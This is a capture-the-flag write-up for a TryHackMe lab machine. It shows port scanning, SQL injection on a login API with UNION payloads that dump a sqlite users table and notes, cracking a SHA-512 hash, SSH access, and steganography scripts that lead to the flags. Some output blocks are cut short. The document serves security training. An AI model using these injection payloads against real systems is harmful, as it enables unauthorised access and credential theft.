## Enumeration

After running rustscan we get to know that there are only two ports running on the given IP

```bash
# Nmap 7.95 scan initiated Wed Dec 24 18:16:31 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4

Now lets try to enumerate using `gobuster` as there is no home/index page available
[Insert image here from the Pictures directory in kali]

Now when I used gobuster I got these results

```bash

Now let's check info/version using curl for the given..
And yeah we found our server build

okay now lets check the `/get_image`

```sh
┌──(undead-ghost㉿kali)-[~/…/THM/THM_CTFs/Mediums/Twin]

```

So it's not really worth anything here as it is throwing a 500 error.

Okay lets again check the /info endpoint and we get to know that it's asking for `login creds` and it's and API so we now try to get something by using an endpoint `/api/login` and so lets try to give it using -X POST

Here's what we got

```sh
└─$ curl -vv http://10.49.133.149/api/login -X POST -d "username=test&password=testt"
Note: Unnecessary use of -X or --request, POST is already inferred.

```

It's saying username or password passed are incorrect meaning the api is interacting with our request so what can we do here ...

> It's a login box
> maybe using a database (of course right?)
> So maybe SQL (whyyy not?)
> Then we can make use of SQLi
> So we create a python program with request to throw multiple sqli request at the /api/login

## This step I needed to do in the first part but I though that wouldn't be necessary but I guess it will be a help for now so

> ` We need to add the IP in out /etc/hosts with a host to work on the IP with a little ease`

> `[Victims IP] utwin.thm`

add the above line in your /etc/hosts change the IP with your machine IP and you can name anything you want for the host :).

Yeah it's a little big but it is given like that for good understanding...

So got this as a output when we used the above script

```

This means that the `/api/login` is vulnerable to sqli and we got to know that there are five users

```plain
How many users are there?
--> 5
1. mary_ann
2. julias
3. vincent
4. linda
5. marnie
```

now we change the payload and try to attack the database

> First let's check which dbms it is and it's version
> we one by one try each n every possbility like MySQL, Postgresql, sqlite.

cut to the chase it's sqlite
`SQL_PAYLOAD = """' UNION ALL SELECT NULL,sqlite_version()-- -"""`
we used the above payload to get the version of the dbms and it's:

```sh

  [
    null,
    "CREATE INDEX \"id\" ON \"users\" (\n\t\"id\"\n)"
  ]
]


==================================================
```

So now we know that there are three tables --> `1. users, 2. sqlite_sequence, 3. notes` & there are username and passwords stored so we can get them :)

`SQL_PAYLOAD = """' UNION ALL SELECT NULL,id || ':' || username || ':' || password FROM users-- -"""`

> The `||` is used to cancatenate multiple strings while resulting the output of a query

> And yeah we got this:

```sh
==================================================
Request #1 | 2025-12-24 19:51:48 | Status: 200
==================================================

[
  [
    null,
    "1:mary_ann:continue..."
  ],
  [
    null,
    "2:julias:Red"
  ],
  [
    null,
    "3:vincent:Orange"
  ],
  [
    null,
    "4:linda:Green"
  ],
  [
    null,
    "5:marnie:Yellow "
  ]
]


==================================================

```

Looking at the above its not like it will be any of useful as those are just the colors for the users ( we have a question for it)

```plain
What colour is Vincent?
--> Orange
```

Okay now lets look at the notes

`SQL_PAYLOAD = """' UNION ALL SELECT NULL,id || ':' || user_id || ':' || note_sql || ':' || notes FROM notes-- -"""`

Ohhhh look what we found here::::>>>>

```sh
==================================================
Request #1 | 2025-12-24 19:59:01 | Status: 200
==================================================

[
  [
    null,
    "1:1:1:I have left my notes on the server.  They will me help get the family back together. "
  ],
  [
    null,
    "2:1:2:My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]


==================================================
```

Now its time to crack it :)
And we cracked it easily with the help of `crackstation.net`

```
Hash									                                            Type	   Result
eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ec
aa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4	sha512	experiment
```

So the password is `experiment` for mary_ann and how do I know it's for mary_ann
For it we need to look at the `id` which is `1` and when we yeah so after using the password we got into the system as `mary_ann` user

```sh
└─$ ssh mary_ann@10.48.183.244

Hello Mary Ann
[mary_ann@UnstableTwin ~]$ clear
```

Let's Find the user flag..

> `THM{Mary_Ann_notes}`

Here another file is present `server_notes.txt`

```bash
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

Which says the above which I think is a hint to use `GET` to get an Image by using a NAME as a parameter

So this was a little confusing for me also but then I looked up a writeup yeah had too :`)

Now,
We got the folder with multiple things in `/opt`

```sh
[mary_ann@UnstableTwin ~]$ cd /opt/
[mary_ann@UnstableTwin opt]$ ls
unstabletwin
[mary_ann@UnstableTwin opt]$ cd unstabletwin/ && ls -lah

if __name__ == '__main__':
    app.run(port=5001)

```

and we got the following things

```plain
    Port 5000:
        /get_image with GET parameter marnie or linda or mary_ann, will get file Twins-Kelly-Preston.jpg, Twins-Chloe-Webb.jpg, Twins-Bonnie-Bartlett.jpg
    Port 5001:
        /get_image with GET parameter vincent or julias or mary_ann, will get file Twins-Danny-DeVito.jpg, Twins-Arnold-Schwarzenegger.jpg, Twins-Bonnie-Bartlett.jpg
```

So to get all the images at once we wrote a bash script to work for us

> {NOTE} -> Remember to use `chmod +x script_name` as we need to make it executable.

```sh
#!/bin/bash

URL="http://utwin.thm/get_image"
count=1

names=(vincent vincent julias julias mary_ann marnie marnie linda linda)

for name in "${names[@]}"; do
  outfile="${name}_${count}.jpg"
  echo "Downloading $outfile"
  curl -s "$URL" --get -d "name=$name" -o "$outfile"
  ((count++))
done
```

> Remember to add victim IP in /etc/hosts in the URL variable above.

we got all the images now we will check for any hidden files in the images using `steghide`

```bash
└─$ ./steghide_script.sh
[*] Processing julias_3.jpg → steghide_output/julias_3.txt
[*] Processing julias_4.jpg → steghide_output/julias_4.txt
[*] Processing linda_8.jpg → steghide_output/linda_8.txt
[*] Processing linda_9.jpg → steghide_output/linda_9.txt
[*] Processing marnie_6.jpg → steghide_output/marnie_6.txt
[*] Processing marnie_7.jpg → steghide_output/marnie_7.txt
[*] Processing mary_ann_5.jpg → steghide_output/mary_ann_5.txt
[*] Processing vincent_1.jpg → steghide_output/vincent_1.txt
[*] Processing vincent_2.jpg → steghide_output/vincent_2.txt
[✓] Done. Outputs saved in steghide_output/

```

So this is the script we used for `steghide`

```sh
#!/bin/bash

OUTDIR="steghide_output"
mkdir -p "$OUTDIR"

for img in *.jpg; do
  # Skip if no jpg files exist
  [ -e "$img" ] || continue

  base="${img%.*}"
  outfile="$OUTDIR/${base}.txt"

  echo "[*] Processing $img → $outfile"

  # Run steghide (empty passphrase)
  steghide extract -sf "$img" -p "" -xf "$outfile" -f 2>/dev/null

  # If steghide extracted nothing, note it
  if [ ! -s "$outfile" ]; then
    echo "No hidden data found." > "$outfile"
  fi
done

echo "[✓] Done. Outputs saved in $OUTDIR/"
```

and thus we got the output

```sh
└─$ cat *.txt
Red - 1DVsdb2uEE0k5HK4GAIZ
No hidden data found.
Green - eVYvs6J6HKpZWPG8pfeHoNG1
No hidden data found.
Yellow - jKLNAAeCdl2J8BCRuXVX
No hidden data found.
You need to find all my children and arrange in a rainbow!
Orange - PS0Mby2jomUKLjvQ4OSw
No hidden data found.
```

It says we need to arrange the colors in the rainbow pattern (VIBGYOR pattern)

`R - O - Y - G --> 1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1`

We check the given encoded text for type of cipher in [dcode.fr](dcode.fr/en) using `cipher identifier` which result in `base62`
so after decoding from `base62` we get this

$\rightarrow$ `THM{The_Family_Is_Back_Together}`
The final flag

Thus solving the thing as a whole

> IT was very VAST right??
